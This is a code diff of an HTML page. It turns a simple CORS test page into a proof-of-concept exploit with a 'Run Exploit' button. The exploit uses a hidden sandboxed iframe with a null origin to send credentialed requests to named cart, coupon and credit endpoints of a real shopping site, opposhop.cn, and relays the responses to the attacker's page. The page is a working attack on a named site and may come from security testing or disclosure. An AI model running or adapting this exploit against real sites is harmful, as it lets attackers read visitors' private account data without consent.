@@ -1,81 +1,76 @@
 <!DOCTYPE html>
 <html>
+<body>
 
-<head>
-<meta charset="UTF-8">
+<button onclick="run()">Run Exploit</button>
+
+<pre id="out"></pre>
 
 <script>
 
 const endpoints = {
-cart: "https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
-count: "https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
-coupon: "https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
-credit: "https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
+cart:"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
+count:"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
+coupon:"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
+credit:"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
 }
 
-function handleCorsRequest(type){
+function run(){
+
+let code = `
+<script>
+
+const endpoints = ${JSON.stringify(endpoints)}
 
 for (let name in endpoints){
 
 fetch(endpoints[name],{
-
-method: "GET",
-
-mode: "cors",
-
-credentials: type === "withCredentials" ? "include" : "omit",
-
-headers:{
-"Accept":"*/*",
-"Accept-Language":"en-US,en;q=0.9"
-}
-
+method:"GET",
+credentials:"include"
 })
-
-.then(res => res.text())
-
-.then(data => {
-
-document.getElementById(`message-${type}`).textContent +=
-"\n\nEndpoint: " + name +
-"\nStatus: SUCCESS\nResponse:\n" + data + "\n"
-
-})
-
-.catch(error => {
-
-document.getElementById(`message-${type}`).textContent +=
-"\n\nEndpoint: " + name +
-"\nStatus: FAILED\nError: " + error.message + "\n"
-
+.then(r=>r.text().then(t=>{
+parent.postMessage({
+endpoint:name,
+status:r.status,
+body:t
+},"*")
+}))
+.catch(e=>{
+parent.postMessage({
+endpoint:name,
+status:"error",
+body:e.toString()
+},"*")
 })
 
 }
 
+<\/script>
+`
+
+let iframe = document.createElement("iframe")
+
+iframe.sandbox = "allow-scripts"
+
+iframe.srcdoc = code
+
+iframe.style.display = "none"
+
+document.body.appendChild(iframe)
+
 }
+
+window.addEventListener("message", e => {
+
+document.getElementById("out").textContent +=
+"\nEndpoint: " + e.data.endpoint +
+"\nStatus: " + e.data.status +
+"\nResponse: " + e.data.body +
+"\n----------------------\n"
+
+})
 
 </script>
 
-</head>
-
-<body>
-
-<h3>CORS Test</h3>
-
-<button onclick="handleCorsRequest('noCredentials')">
-Cross-origin request Without Credentials
-</button>
-
-<button onclick="handleCorsRequest('withCredentials')">
-Cross-origin request With Credentials
-</button>
-
-<h3>Results</h3>
-
-<pre id="message-noCredentials"></pre>
-
-<pre id="message-withCredentials"></pre>
-
 </body>
-
 </html>
